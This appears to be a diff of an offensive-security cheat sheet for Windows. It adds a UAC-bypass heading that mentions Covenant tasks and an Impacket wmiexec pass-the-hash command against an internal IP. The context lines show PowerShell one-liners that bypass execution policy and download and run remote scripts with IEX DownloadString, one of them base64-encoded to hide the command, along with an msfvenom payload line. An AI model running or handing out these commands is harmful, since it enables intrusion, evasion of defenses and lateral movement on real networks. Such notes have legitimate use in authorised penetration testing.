@@ -175,6 +175,9 @@ If you want to invoke everything without touching disk, use something like this:
 powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
 ```
 
+
+#### UAC Bypasses
+
 Covenant has `BypassUACCommand` and `BypassUACGrunt` Tasks which can be used 
 
 ```cpp
@@ -319,4 +322,11 @@ msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading
 $string = "iex (New-Object Net.WebClient).DownloadString('http://<webServer>:8082/ps.ps1')"
 $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
 echo $encodedcommand
+```
+
+#### Impacket 
+
+Impacket is a collection of Python classes for working with network protocols
+```cpp
+proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes e353da88f9c4331504f70d471f0f9cb1:REDACTED a.user@10.10.120.1
 ```
